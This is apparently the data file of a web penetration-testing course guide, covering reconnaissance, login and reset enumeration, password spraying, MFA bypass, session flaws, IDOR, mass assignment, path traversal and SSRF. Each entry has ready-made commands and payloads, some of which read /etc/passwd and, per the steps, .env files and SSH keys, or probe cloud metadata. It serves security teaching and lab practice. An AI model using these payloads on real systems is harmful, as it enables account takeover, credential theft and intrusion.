const COURSE_DATA = [
  {
    id: "sec-6",
    num: "6.0",
    title: "Information Gathering",
    items: [
      {
        id: "6.1",
        ref: "6.1",
        syllabusRefs: ["6.1"],
        title: "Fingerprinting the Server",
        type: "recon",
        summary: "Identify the underlying web server, backend language, framework, and version numbers before launching targeted checks. Server banners, response headers, cookie names, and default error pages reveal how requests are routed and parsed.",
        steps: [
          "Fetch raw HTTP response headers with <code>curl -I</code> or inspect traffic in Burp Proxy HTTP History.",
          "Look for explicit headers like <code>Server</code>, <code>X-Powered-By</code>, <code>X-AspNet-Version</code>, or generator meta tags in the HTML source.",
          "Inspect session cookie names for framework signatures: <code>PHPSESSID</code> (PHP), <code>connect.sid</code> (Express/Node), <code>JSESSIONID</code> (Java), <code>session</code> (Flask/Django).",
          "Run <code>whatweb</code> and trigger a 404/500 error page (e.g., requesting <code>/nonexistent_123.php</code>) to observe default server stack traces or error templates."
        ],
        snippets: [
          {
            label: "Header & Technology Fingerprinting",
            code: "curl -sI {{TARGET_URL}} | grep -iE 'server|powered|cookie|via'\nwhatweb -a 3 {{TARGET_URL}}"
          }
        ],
        indicator: "Exposed version strings (e.g., Apache/2.4.49, Werkzeug/2.0, PHP/8.1), verbose framework debug pages, or identifiable session cookie conventions.",
        syllabusItems: [
          { id: "6.1", title: "Fingerprinting the Server", kind: "Topic" }
        ]
      },
      {
        id: "6.2",
        ref: "6.2",
        syllabusRefs: ["6.2"],
        title: "Directory & File Bruteforcing",
        type: "recon",
        summary: "Discover unlinked directories, admin panels, backup archives, and configuration files using wordlists. Pair extension fuzzing with your server fingerprint (such as .php, .bak, .txt, or .env) to uncover hidden endpoints.",
        steps: [
          "Select a baseline wordlist such as SecLists <code>raft-medium-directories.txt</code> or <code>common.txt</code>.",
          "Run <code>ffuf</code> or <code>gobuster</code> against the root path, matching or filtering out default wildcard status codes and custom 404 lengths (<code>-fs</code> / <code>-fw</code>).",
          "Append technology-relevant extensions (<code>-e .php,.txt,.bak,.zip,.old</code>) based on the stack identified in step 6.1.",
          "Recursively fuzz newly discovered directories (such as <code>/admin/</code>, <code>/api/</code>, <code>/backup/</code>, or <code>/uploads/</code>)."
        ],
        snippets: [
          {
            label: "ffuf Directory & Extension Fuzzing",
            code: "ffuf -u {{TARGET_URL}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 -e .php,.bak,.txt,.old"
          }
        ],
        indicator: "HTTP 200, 301, 302, 401, or 403 responses on unlinked endpoints like /admin, /config.php.bak, /.git/HEAD, or /api/v1/.",
        syllabusItems: [
          { id: "6.2", title: "Directory Bruteforcing", kind: "Topic" }
        ]
      },
      {
        id: "6.3",
        ref: "6.3",
        syllabusRefs: ["6.3"],
        title: "Subdomains & Virtual Hosts",
        type: "recon",
        summary: "Enumerate DNS subdomains and fuzz the HTTP Host header to uncover virtual hosts hosted on the same IP address. Internal staging apps, dev portals, and legacy APIs frequently share infrastructure with the main site.",
        steps: [
          "Send a baseline request with a random <code>Host: invalid123.{{TARGET_HOST}}</code> header to observe the default response size or word count.",
          "Fuzz the <code>Host</code> header using <code>ffuf</code> and filter out the baseline response size (<code>-fs</code>) or word count (<code>-fw</code>).",
          "When a valid virtual host is discovered (e.g., <code>dev.{{TARGET_HOST}}</code>), add it to <code>/etc/hosts</code> pointing to the target IP so your browser and Burp can reach it.",
          "Repeat fingerprinting and directory discovery against each newly identified vhost."
        ],
        snippets: [
          {
            label: "Virtual Host Fuzzing via Host Header",
            code: "ffuf -u {{TARGET_URL}} -H \"Host: FUZZ.{{TARGET_HOST}}\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <BASELINE_SIZE>"
          }
        ],
        indicator: "Distinct HTTP response length, status code, or page title when supplying a specific Host header (e.g., admin, dev, staging, api, internal).",
        syllabusItems: [
          { id: "6.3", title: "Subdomains & Virtual Hosts", kind: "Topic" }
        ]
      },
      {
        id: "6.4",
        ref: "6.4",
        syllabusRefs: ["6.4", "6.5"],
        title: "Become a User (Map Authenticated Surface)",
        type: "recon",
        summary: "Create a standard account and walk through every legitimate feature while proxying traffic through Burp Suite. Interacting as a real user populates your sitemap with authenticated API routes, parameters, and state-changing requests.",
        steps: [
          "Register one or two test user accounts (having two accounts makes later horizontal IDOR testing trivial).",
          "Click through every link, submit every form, update profile settings, upload sample files, and trigger password resets while Burp Proxy records traffic.",
          "Review Burp Target -> Site map and HTTP History to catalog hidden parameters, API conventions (REST/GraphQL), and role indicators.",
          "Check client-side JavaScript bundles (<code>.js</code> files) and HTML comments for unlinked API routes or developer notes."
        ],
        snippets: [
          {
            label: "Extract Endpoints from JS Files",
            code: "curl -s {{TARGET_URL}}/app.js | grep -oE '(\"/api/[^\"]+\"|\"/[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+\")' | sort -u"
          }
        ],
        indicator: "Populated proxy history showing authenticated endpoints, user ID formats (sequential integers vs. UUIDs), and role/state parameters.",
        syllabusItems: [
          { id: "6.4", title: "Become a User", kind: "Topic" },
          { id: "6.5", title: "Section Quiz (Information Gathering)", kind: "Quiz", quizReview: "Verify you can: (1) distinguish Server/X-Powered-By headers, (2) filter wildcard 200 responses during directory brute-forcing, (3) explain the difference between DNS subdomains and Host-header virtual hosts, and (4) map authenticated workflows in a proxy." }
        ]
      }
    ]
  },
  {
    id: "sec-7",
    num: "7.0",
    title: "Authentication",
    items: [
      {
        id: "7.1",
        ref: "7.1–7.2",
        syllabusRefs: ["7.1", "7.2"],
        title: "Login Page Mechanics & Baseline Auth Checks",
        type: "auth",
        summary: "Analyze how credentials are transmitted and validated on the login page. Test for default or weak credentials, missing rate-limiting or lockout protections, and insecure credential handling in requests and responses.",
        steps: [
          "Submit a login attempt and inspect the POST request in Burp Proxy: check whether credentials are sent in cleartext, base64, JSON, or form-urlencoded format.",
          "Test common default credential pairs (<code>admin:admin</code>, <code>admin:password</code>, <code>test:test</code>, <code>root:root</code>) and organization-specific defaults.",
          "Send 15–20 rapid failed login attempts in Burp Intruder or Repeater to verify if rate limiting (HTTP 429), CAPTCHA, or account lockout triggers.",
          "Check if the login response returns overly verbose debug fields or sets session tokens even before authentication succeeds."
        ],
        snippets: [
          {
            label: "Quick Rate-Limit Check with curl",
            code: "for i in {1..15}; do curl -s -o /dev/null -w \"%{http_code} %{size_download}\\n\" -X POST {{TARGET_URL}}/login -d \"username=admin&password=wrong$i\"; done"
          }
        ],
        indicator: "Login accepts default credentials, allows unlimited rapid brute-force attempts without HTTP 429 or lockout, or leaks sensitive auth state in responses.",
        syllabusItems: [
          { id: "7.1", title: "Understanding Authentication", kind: "Overview" },
          { id: "7.2", title: "Lab: Testing Login Page", kind: "Lab" }
        ]
      },
      {
        id: "7.3",
        ref: "7.3–7.4",
        syllabusRefs: ["7.3", "7.4"],
        title: "User Enumeration via Login Page",
        type: "auth",
        summary: "Determine whether the login endpoint reveals if a username or email exists in the database. Differences in error phrasing, HTTP status codes, response byte length, or server processing time allow attackers to compile a valid user list.",
        steps: [
          "Submit a known-invalid username (e.g., <code>nonexistent_user_99182</code>) with an invalid password and record the exact response text, status code, Content-Length, and response time.",
          "Submit a known-valid username (from registration, page authors, or common names like <code>admin</code>) with a wrong password and compare the two responses in Burp Comparer.",
          "Look for subtle discrepancies: e.g., <code>Invalid username</code> vs. <code>Invalid password</code>, trailing whitespace, different redirect locations, or a timing delay caused by password hashing (bcrypt/argon2) running only on valid accounts.",
          "Use Burp Intruder (Sniper) or <code>ffuf</code> with a username wordlist, filtering out the baseline 'invalid user' content length or string."
        ],
        snippets: [
          {
            label: "Username Enumeration with ffuf",
            code: "ffuf -u {{TARGET_URL}}/login -X POST -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"username=FUZZ&password=WrongPassword123!\" \\\n  -w /usr/share/seclists/Usernames/Names/names.txt -fr \"Invalid username\""
          }
        ],
        indicator: "Distinct error message, byte length, HTTP status code, or measurable timing spike when a valid username is supplied with an incorrect password.",
        syllabusItems: [
          { id: "7.3", title: "Challenge: User Enumeration via Login Page", kind: "Challenge" },
          { id: "7.4", title: "Demo: User Enumeration via Login Page", kind: "Demo" }
        ]
      },
      {
        id: "7.5",
        ref: "7.5",
        syllabusRefs: ["7.5"],
        title: "Password Spraying",
        type: "auth",
        summary: "Once valid usernames are enumerated, test a small number of common or seasonal passwords across all valid users rather than brute-forcing a single account. This evades per-account lockout thresholds while targeting weak password choices.",
        steps: [
          "Compile the list of confirmed valid usernames discovered via login/reset enumeration or OSINT.",
          "In Burp Intruder, load the login POST request, mark <code>username</code> as payload position 1, and set a single candidate password (e.g., <code>Password123!</code>, <code>Summer2026!</code>, or <code>Welcome1</code>).",
          "Alternatively, use Cluster Bomb mode with your valid usernames list in Payload Set 1 and a short top-10 password list in Payload Set 2, throttling requests if per-account lockouts exist.",
          "Sort Intruder results by Status Code (e.g., <code>302 Found</code>) or Length to spot successful logins."
        ],
        snippets: [
          {
            label: "Password Spraying with ffuf (Clusterbomb)",
            code: "ffuf -u {{TARGET_URL}}/login -X POST -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"username=USER&password=PASS\" \\\n  -w valid_users.txt:USER -w top_passwords.txt:PASS -mc 302,200 -fs <FAILED_LOGIN_SIZE>"
          }
        ],
        indicator: "HTTP 302 redirect to /dashboard or issuance of a new session cookie for one or more sprayed accounts.",
        syllabusItems: [
          { id: "7.5", title: "Challenge: Password Spraying", kind: "Challenge" }
        ]
      },
      {
        id: "7.6",
        ref: "7.6",
        syllabusRefs: ["7.6"],
        title: "Testing Registration",
        type: "auth",
        summary: "Audit the account registration flow for username enumeration, weak password policy enforcement, duplicate account overwrite bugs, and hidden role parameters. Flawed signup logic can allow attackers to overwrite existing accounts or register privileged users.",
        steps: [
          "Attempt to register an already-taken username or email (e.g., <code>admin</code>) and check if the response explicitly confirms the account exists.",
          "Test registering with leading/trailing spaces (<code>\" admin\"</code>) or case variations (<code>Admin</code>) to see if the database truncates or normalizes the username into an existing account.",
          "Check if the registration request accepts extra parameters like <code>role=admin</code> or <code>isVerified=true</code>.",
          "Verify password complexity rules and whether email verification can be bypassed or auto-logged-in immediately upon signup."
        ],
        snippets: [
          {
            label: "Registration Parameter & Collision Test",
            code: "POST /register HTTP/1.1\nHost: {{TARGET_HOST}}\nContent-Type: application/json\n\n{\"username\":\"admin \",\"email\":\"attacker@test.local\",\"password\":\"Test1234!\"}"
          }
        ],
        indicator: "Explicit 'Username/Email already registered' message, weak 1-character passwords allowed, or ability to register collision variants of existing users.",
        syllabusItems: [
          { id: "7.6", title: "Lab: Testing Registration", kind: "Lab" }
        ]
      },
      {
        id: "7.7",
        ref: "7.7–7.8",
        syllabusRefs: ["7.7", "7.8"],
        title: "User Enumeration via Password Reset",
        type: "auth",
        summary: "Even when login pages use generic error messages, forgot-password forms often forget to mask whether an email or username is registered. Test password reset endpoints for differential responses, status codes, or leaked reset tokens.",
        steps: [
          "Submit a known-unregistered email/username to the password reset endpoint and record the response status, body, and Content-Length.",
          "Submit a registered email/username and compare responses in Burp Repeater / Comparer.",
          "Check if the HTTP response body or headers inadvertently leak the reset token or user ID directly in the JSON response.",
          "Fuzz the password reset parameter with a username/email list using Burp Intruder or <code>ffuf</code> to enumerate valid accounts."
        ],
        snippets: [
          {
            label: "Password Reset Enumeration via ffuf",
            code: "ffuf -u {{TARGET_URL}}/forgot-password -X POST -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"email=FUZZ@{{TARGET_HOST}}\" -w /usr/share/seclists/Usernames/Names/names.txt -fr \"not found\""
          }
        ],
        indicator: "Password reset returns 'User not found' vs. 'Reset link sent', returns different HTTP status codes (404 vs. 200), or leaks reset tokens in the response.",
        syllabusItems: [
          { id: "7.7", title: "Challenge: User Enumeration via Password Reset", kind: "Challenge" },
          { id: "7.8", title: "Demo: User Enumeration via Password Reset", kind: "Demo" },
          { id: "7.9", title: "Section Quiz (Authentication)", kind: "Quiz", quizReview: "Verify you can: (1) spot subtle byte-length or timing differences on login/reset forms, (2) distinguish brute-forcing from password spraying, and (3) exploit registration flaws to enumerate or impersonate users." }
        ]
      },
      {
        id: "7.10",
        ref: "7.10",
        syllabusRefs: ["7.10"],
        title: "Bypass Multi-Factor Authentication (MFA)",
        type: "auth",
        optional: true,
        summary: "Test whether the second authentication factor can be skipped, brute-forced, or tricked via state manipulation. Common flaws include broken multi-step session checks, lack of rate limiting on 4–6 digit OTP codes, and response tampering.",
        steps: [
          "After completing step 1 (username + password) and landing on the MFA prompt, try navigating directly to <code>/dashboard</code> or <code>/profile</code> (forced browsing) using the pre-MFA cookie.",
          "Check if the MFA verification request binds the OTP to your current user session or relies on a modifiable <code>user</code> / <code>email</code> cookie or body parameter.",
          "Test OTP brute-forcing in Burp Intruder if the token is 4–6 digits and rate limiting is missing or tied only to an <code>X-Forwarded-For</code> IP header.",
          "Intercept the MFA failure response (e.g., <code>{\"success\":false}</code> or <code>401</code>) and modify it to <code>{\"success\":true}</code> or <code>200 OK</code> in Burp Proxy."
        ],
        snippets: [
          {
            label: "4-Digit OTP Brute-Force Wordlist Generation",
            code: "seq -w 0000 9999 > otp_4digit.txt\nffuf -u {{TARGET_URL}}/mfa-verify -X POST -H \"Cookie: session=<PRE_MFA_COOKIE>\" \\\n  -d \"otp=FUZZ\" -w otp_4digit.txt -mc 200,302 -fs <INVALID_OTP_SIZE>"
          }
        ],
        indicator: "Direct access to authenticated pages without completing MFA, successful OTP brute-force due to missing rate limits, or client-trusted JSON boolean checks.",
        syllabusItems: [
          { id: "7.10", title: "(Optional): Bypass MFA", kind: "Optional" }
        ]
      }
    ]
  },
  {
    id: "sec-8",
    num: "8.0",
    title: "Session Management",
    items: [
      {
        id: "8.1",
        ref: "8.1",
        syllabusRefs: ["8.1"],
        title: "Session Token & Cookie Security Attributes",
        type: "session",
        summary: "Inspect how the application issues, stores, and protects session tokens. Missing cookie flags or predictable/encoded token formats expose sessions to XSS theft, cross-site request forgery, or token forgery.",
        steps: [
          "Log in and inspect the <code>Set-Cookie</code> header in Burp Proxy.",
          "Verify security flags: <code>HttpOnly</code> (prevents JS <code>document.cookie</code> access), <code>Secure</code> (HTTPS-only transmission), and <code>SameSite=Strict</code> or <code>Lax</code> (CSRF protection).",
          "Decode the token if it appears to be Base64, hex, URL-encoded, or a JWT (<code>eyJ...</code>) to check if user IDs or roles are stored client-side without cryptographic signing.",
          "If session tokens look short or sequential, capture 50–100 tokens in Burp Sequencer to test randomness and entropy."
        ],
        snippets: [
          {
            label: "Inspect Set-Cookie Flags & Decode Token",
            code: "curl -sI -X POST {{TARGET_URL}}/login -d \"username=user&password=password\" | grep -i set-cookie\n# If token is Base64/JWT:\necho \"<TOKEN_VALUE>\" | base64 -d"
          }
        ],
        indicator: "Missing HttpOnly/Secure/SameSite flags, unsigned or weakly signed JWTs, or predictable/base64-encoded user data in session cookies.",
        syllabusItems: [
          { id: "8.1", title: "Session Management Overview", kind: "Overview" }
        ]
      },
      {
        id: "8.2",
        ref: "8.2",
        syllabusRefs: ["8.2"],
        title: "Session Expiration & Logout Invalidation",
        type: "session",
        summary: "Verify that logging out actually destroys the session on the server rather than merely clearing the cookie in the browser. If the backend does not invalidate the token, any previously captured cookie remains usable indefinitely.",
        steps: [
          "Log in to the application and send an authenticated request (e.g., <code>GET /profile</code>) to Burp Repeater. Confirm it returns <code>200 OK</code> with your account data.",
          "Click the Logout button in the browser and observe the logout request.",
          "Return to Burp Repeater and replay the exact same <code>GET /profile</code> request using the pre-logout session cookie.",
          "Check if the server still returns your authenticated profile instead of redirecting to <code>/login</code> or returning <code>401 Unauthorized</code>."
        ],
        snippets: [
          {
            label: "Replay Session Cookie After Logout",
            code: "# 1. Copy authenticated Cookie header before logging out\n# 2. Trigger /logout in browser\n# 3. Replay in Repeater or curl:\ncurl -i {{TARGET_URL}}/profile -H \"Cookie: session=<OLD_SESSION_TOKEN>\""
          }
        ],
        indicator: "Replaying the old session cookie after logout still grants full access to authenticated endpoints.",
        syllabusItems: [
          { id: "8.2", title: "Lab: Session Expiration", kind: "Lab" }
        ]
      },
      {
        id: "8.3",
        ref: "8.3",
        syllabusRefs: ["8.3"],
        title: "Session Fixation",
        type: "session",
        summary: "Check whether the application rotates the session identifier upon login. If a pre-authentication session cookie is upgraded to an authenticated session without issuing a new token ID, an attacker who plants a known session ID can hijack the victim's account.",
        steps: [
          "Open an fresh private window, visit the login page, and record the unauthenticated session cookie value assigned before logging in (or set an arbitrary cookie like <code>session=fixed123</code>).",
          "Submit valid login credentials while passing that pre-login session cookie.",
          "Inspect the login response for a <code>Set-Cookie</code> header: check whether the server issues a brand-new random session ID or keeps the exact same token value.",
          "Also verify whether the application accepts arbitrary session IDs supplied in URL query parameters or cookies."
        ],
        snippets: [
          {
            label: "Compare Pre-Auth vs. Post-Auth Session Cookie",
            code: "# Send login with a known pre-auth cookie and check if Set-Cookie rotates it:\ncurl -i -X POST {{TARGET_URL}}/login \\\n  -H \"Cookie: session=PRE_AUTH_TOKEN_123\" \\\n  -d \"username=user&password=password\""
          }
        ],
        indicator: "The session cookie value before login remains identical after authentication, upgrading the pre-authenticated token in place.",
        syllabusItems: [
          { id: "8.3", title: "Lab: Session Fixation", kind: "Lab" }
        ]
      },
      {
        id: "8.4",
        ref: "8.4",
        syllabusRefs: ["8.4", "8.5"],
        title: "Password & Email Update Session Handling",
        type: "session",
        summary: "Test sensitive account state changes (updating password or email address) to see if they require the user's current password and whether they invalidate other active sessions. Weak validation allows a temporary session hijack to become permanent account takeover.",
        steps: [
          "Log into the same account in two separate browsers (Browser A and Browser B) so you have two distinct active session tokens.",
          "In Browser A, intercept the Password Update and Email Update requests in Burp Proxy.",
          "Check if the request requires the <code>current_password</code> field; if present, try omitting it or sending an empty/wrong value in Repeater.",
          "After successfully changing the password in Browser A, test whether Browser B's session cookie is immediately invalidated or remains active."
        ],
        snippets: [
          {
            label: "Test Password Change Without Current Password",
            code: "POST /settings/password HTTP/1.1\nHost: {{TARGET_HOST}}\nCookie: session=<VALID_SESSION>\nContent-Type: application/x-www-form-urlencoded\n\nnew_password=Pwned123!&confirm_password=Pwned123!"
          }
        ],
        indicator: "Password or email can be updated without verifying the current password, or existing parallel sessions remain valid after a password reset/change.",
        syllabusItems: [
          { id: "8.4", title: "Lab: Password / Email Updates", kind: "Lab" },
          { id: "8.5", title: "Section Quiz (Session Management)", kind: "Quiz", quizReview: "Verify you can: (1) explain HttpOnly, Secure, and SameSite cookie attributes, (2) test server-side session termination on logout, (3) identify session fixation during login, and (4) audit session rotation on password/email changes." }
        ]
      }
    ]
  },
  {
    id: "sec-9",
    num: "9.0",
    title: "Authorization",
    items: [
      {
        id: "9.1",
        ref: "9.1–9.3",
        syllabusRefs: ["9.1", "9.2", "9.3"],
        title: "IDOR on Email & Profile Updates",
        type: "authz",
        summary: "Test Insecure Direct Object References (IDOR) by changing user identifiers (such as id, user_id, uid, or username) in profile and email update requests. Updating another user's email address to one you control often enables full account takeover via Password Reset.",
        steps: [
          "Log in as a standard user and update your email or profile while intercepting the request in Burp Proxy.",
          "Send the request to Burp Repeater and look for any user identifier in the URL path (<code>/api/users/42/email</code>), query string, form body (<code>user_id=42</code>), or cookies.",
          "If no ID is visible in the update POST, inspect GET requests for your profile to see how user IDs are structured, then try adding <code>id=1</code> or <code>user_id=1</code> into the update body.",
          "Change the target ID to another user (e.g., <code>1</code> for admin) and set the email to your controlled address, then trigger a password reset for that user."
        ],
        snippets: [
          {
            label: "IDOR Email Update Request Tampering",
            code: "POST /profile/update-email HTTP/1.1\nHost: {{TARGET_HOST}}\nCookie: session=<YOUR_LOW_PRIV_SESSION>\nContent-Type: application/x-www-form-urlencoded\n\nuser_id=1&email=attacker@test.local"
          }
        ],
        indicator: "HTTP 200/302 confirming the email or profile was updated for another user's ID, allowing password reset takeover or data disclosure.",
        syllabusItems: [
          { id: "9.1", title: "Understanding Authorization", kind: "Overview" },
          { id: "9.2", title: "Challenge: IDOR for Email Update", kind: "Challenge" },
          { id: "9.3", title: "Demo: IDOR for Email Update", kind: "Demo" }
        ]
      },
      {
        id: "9.4",
        ref: "9.4–9.5",
        syllabusRefs: ["9.4", "9.5"],
        title: "Broken Access Controls (Vertical & Horizontal)",
        type: "authz",
        summary: "Test whether privileged routes, admin panels, or other users' resources enforce server-side role checks or merely hide links in the UI. Always re-test endpoints discovered via directory brute-forcing or JS files using both low-privilege and unauthenticated sessions.",
        steps: [
          "Browse directly to sensitive paths found during recon or in client-side JS (e.g., <code>/admin</code>, <code>/admin/users</code>, <code>/api/admin/delete</code>, <code>/export</code>) while logged in as a regular user.",
          "Check if changing the HTTP method (e.g., <code>GET</code> to <code>POST</code>, or <code>POST</code> to <code>GET</code> / <code>PUT</code>) bypasses route-specific authorization middleware.",
          "Test adding common rewrite/proxy headers such as <code>X-Original-URL: /admin</code>, <code>X-Rewrite-URL: /admin</code>, or <code>X-Forwarded-For: 127.0.0.1</code>.",
          "Inspect HTTP 302 redirects on admin pages in Burp: sometimes the server returns the full admin HTML body inside the 302 response before the browser follows the redirect."
        ],
        snippets: [
          {
            label: "Forced Browsing & 302 Body Inspection",
            code: "curl -i {{TARGET_URL}}/admin -H \"Cookie: session=<LOW_PRIV_SESSION>\"\n# Check if response body contains admin HTML despite a 302 redirect header"
          }
        ],
        indicator: "Low-privileged or unauthenticated user can view admin pages, invoke privileged state-changing endpoints, or read full page contents inside a 302 redirect body.",
        syllabusItems: [
          { id: "9.4", title: "Challenge: Broken Access Controls", kind: "Challenge" },
          { id: "9.5", title: "Demo: Broken Access Controls", kind: "Demo" }
        ]
      },
      {
        id: "9.6",
        ref: "9.6–9.7",
        syllabusRefs: ["9.6", "9.7"],
        title: "Mass Assignment on Profile Update",
        type: "authz",
        summary: "Exploit frameworks that automatically bind HTTP request parameters directly to internal database user models. By injecting undocumented fields like role, isAdmin, or is_admin into a profile update or registration request, you can escalate privileges.",
        steps: [
          "Inspect GET responses for your user profile (e.g., <code>GET /api/user</code> or <code>GET /profile</code>) or JavaScript bundles to spot internal property names like <code>role</code>, <code>is_admin</code>, <code>isAdmin</code>, <code>admin</code>, or <code>group</code>.",
          "Intercept a legitimate profile update request (<code>POST /profile</code> or <code>PUT /api/user</code>) in Burp Proxy and send it to Repeater.",
          "Append candidate privilege attributes matching the data format (JSON or form-urlencoded), such as <code>\"role\":\"admin\"</code> or <code>&is_admin=true&role=admin</code>.",
          "Refresh your session or log out and back in to see if your privileges have been elevated."
        ],
        snippets: [
          {
            label: "Mass Assignment Payloads (JSON & Form)",
            code: "// JSON Body:\n{\"username\":\"tyler\",\"email\":\"tyler@test.local\",\"role\":\"admin\",\"is_admin\":true,\"isAdmin\":1}\n\n// Form URL-Encoded:\nusername=tyler&email=tyler@test.local&role=admin&is_admin=1"
          }
        ],
        indicator: "Server accepts the injected attribute without error and updates your user object's role/admin flag in the database.",
        syllabusItems: [
          { id: "9.6", title: "Challenge: Mass Assignment on Profile Update", kind: "Challenge" },
          { id: "9.7", title: "Demo: Mass Assignment on Profile Update", kind: "Demo" }
        ]
      },
      {
        id: "9.8",
        ref: "9.8–9.9",
        syllabusRefs: ["9.8", "9.9", "9.10"],
        title: "Bypass UI Restrictions on Username / Read-Only Fields",
        type: "authz",
        summary: "Never trust disabled inputs, read-only form attributes, or client-side JavaScript validation. Fields greyed out in the UI (such as username or account tier) are frequently still processed by the backend controller if included in the raw HTTP request.",
        steps: [
          "Inspect the profile edit page in browser DevTools to find inputs marked with <code>disabled</code>, <code>readonly</code>, or hidden via CSS.",
          "Note the exact <code>name=\"username\"</code> attribute of the restricted field (or guess it from registration/login forms).",
          "Submit a normal profile update (e.g., updating bio or email), intercept the request in Burp Repeater, and manually add <code>&username=admin</code> to the request body.",
          "Verify whether the application updates your username to a restricted or impersonated account name (which may also trigger secondary privilege checks tied to the username)."
        ],
        snippets: [
          {
            label: "Injecting Read-Only Field in Burp Repeater",
            code: "POST /profile HTTP/1.1\nHost: {{TARGET_HOST}}\nCookie: session=<YOUR_SESSION>\nContent-Type: application/x-www-form-urlencoded\n\nbio=Testing&username=admin"
          }
        ],
        indicator: "Backend processes the parameter that was disabled in the HTML UI, changing the restricted username or account property.",
        syllabusItems: [
          { id: "9.8", title: "Challenge: Bypass UI Restrictions on Username", kind: "Challenge" },
          { id: "9.9", title: "Demo: Bypass UI Restrictions on Username", kind: "Demo" },
          { id: "9.10", title: "Section Quiz (Authorization)", kind: "Quiz", quizReview: "Verify you can: (1) differentiate authentication vs. authorization, (2) chain an email-update IDOR with password reset, (3) exploit mass assignment by discovering model attributes, and (4) bypass client-side disabled/readonly restrictions in Burp." }
        ]
      }
    ]
  },
  {
    id: "sec-10",
    num: "10.0",
    title: "Server-Side Attacks - Part 1",
    items: [
      {
        id: "10.1",
        ref: "10.1–10.4",
        syllabusRefs: ["10.1", "10.2", "10.3", "10.4"],
        title: "Path Traversal (Arbitrary File Read)",
        type: "server",
        summary: "Test any parameter that references filenames, templates, downloadable documents, or images (e.g., ?file=, ?page=, ?doc=). Traversing parent directories with ../ allows reading sensitive OS files, application source code, and credentials.",
        steps: [
          "Locate endpoints that fetch files or render partials, including image tags (<code>/image?file=avatar.png</code>) and download links.",
          "Send the request to Burp Repeater and replace the parameter value with <code>../../../../../../etc/passwd</code> (Linux) or <code>..\\..\\..\\..\\windows\\win.ini</code> (Windows).",
          "If basic <code>../</code> sequences are stripped or blocked, test bypasses: absolute paths (<code>/etc/passwd</code>), nested sequences (<code>....//....//....//etc/passwd</code>), URL encoding (<code>%2e%2e%2f</code>), double URL encoding (<code>%252e%252e%252f</code>), or keeping an expected prefix (<code>images/../../../etc/passwd</code>).",
          "Once confirmed, read application source code, <code>.env</code>, <code>/proc/self/environ</code>, <code>/proc/self/cmdline</code>, and SSH keys."
        ],
        snippets: [
          {
            label: "Path Traversal Filter Bypass Payloads",
            code: "curl -s \"{{TARGET_URL}}/view?file=../../../../../../etc/passwd\"\ncurl -s \"{{TARGET_URL}}/view?file=....//....//....//....//etc/passwd\"\ncurl -s \"{{TARGET_URL}}/view?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\""
          }
        ],
        indicator: "Response returns contents of /etc/passwd (root:x:0:0:...), application source code, or configuration files.",
        syllabusItems: [
          { id: "10.1", title: "Intro to Server-Side Attacks", kind: "Overview" },
          { id: "10.2", title: "Path Traversal Overview", kind: "Overview" },
          { id: "10.3", title: "Challenge: Path Traversal", kind: "Challenge" },
          { id: "10.4", title: "Demo: Path Traversal", kind: "Demo" }
        ]
      },
      {
        id: "10.5",
        ref: "10.5–10.7",
        syllabusRefs: ["10.5", "10.6", "10.7"],
        title: "Server-Side Request Forgery (SSRF)",
        type: "server",
        summary: "Coerce the backend server into making HTTP or network requests to internal-only services, localhost ports, or cloud metadata endpoints. Look for parameters that accept full URLs, webhooks, PDF generators, or remote image fetchers.",
        steps: [
          "Identify parameters containing URLs or hostnames (e.g., <code>url=</code>, <code>webhook=</code>, <code>avatar_url=</code>, <code>dest=</code>, <code>stockApi=</code>).",
          "First test an out-of-band callback to your own listener (<code>python3 -m http.server 8000</code> or Burp Collaborator) to confirm the server fetches the URL and see its User-Agent.",
          "Point the parameter to internal loopback addresses: <code>http://127.0.0.1/admin</code>, <code>http://localhost:8080</code>, or scan internal ports (<code>127.0.0.1:FUZZ</code>) using <code>ffuf</code> or Burp Intruder.",
          "If <code>127.0.0.1</code> or <code>localhost</code> is blacklisted, test bypass representations: <code>http://127.1/</code>, <code>http://0.0.0.0/</code>, <code>http://[::1]/</code>, decimal IP <code>http://2130706433/</code>, or an open redirect on the target domain."
        ],
        snippets: [
          {
            label: "Internal Port & Endpoint Discovery via SSRF",
            code: "# Scan internal localhost ports via SSRF parameter:\nffuf -u {{TARGET_URL}}/fetch -X POST -d \"url=http://127.0.0.1:FUZZ/\" -w <(seq 1 10000) -fs <ERROR_SIZE>\n\n# Common SSRF Targets:\nhttp://127.0.0.1/admin\nhttp://169.254.169.254/latest/meta-data/"
          }
        ],
        indicator: "Server returns internal admin panels, internal service banners on loopback ports, or cloud metadata credentials inaccessible from the outside.",
        syllabusItems: [
          { id: "10.5", title: "SSRF Overview", kind: "Overview" },
          { id: "10.6", title: "Challenge: Server-Side Request Forgery (SSRF)", kind: "Challenge" },
          { id: "10.7", title: "Demo: Server-Side Request Forgery", kind: "Demo" }
        ]
      },
      {
        id: "10.8",
        ref: "10.8–10.10",
        syllabusRefs: ["10.8", "10.9", "10.10"],
        title: "Server-Side Template Injection (SSTI)",
        type: "server",
        summary: "Test whether user input is concatenated directly into a server-side template (such as Jinja2, Twig, ERB, Smarty, or Freemarker) before rendering. Mathematical evaluation like {{7*7}} rendering as 49 confirms SSTI and typically leads to remote code execution.",
        steps: [
          "Identify inputs whose values are dynamically rendered on the page (e.g., profile names, custom greeting previews, error messages reflecting the URL path, or email templates).",
          "Submit a polyglot probe string like <code>${{<%[%\"'}}%\\</code> to trigger template syntax errors, or test engine-specific math expressions: <code>{{7*7}}</code>, <code>${7*7}</code>, <code><%= 7*7 %></code>, <code>#{7*7}</code>.",
          "Fingerprint the specific engine: in Jinja2 (Python), <code>{{7*'7'}}</code> outputs <code>7777777</code>, whereas in Twig (PHP) it outputs <code>49</code>.",
          "Escalate to OS command execution using the matching engine gadget (e.g., Jinja2's <code>cycler</code>, <code>lipsum</code>, or <code>self.__init__.__globals__</code>)."
        ],
        snippets: [
          {
            label: "SSTI Detection & Jinja2 / Twig / ERB RCE Payloads",
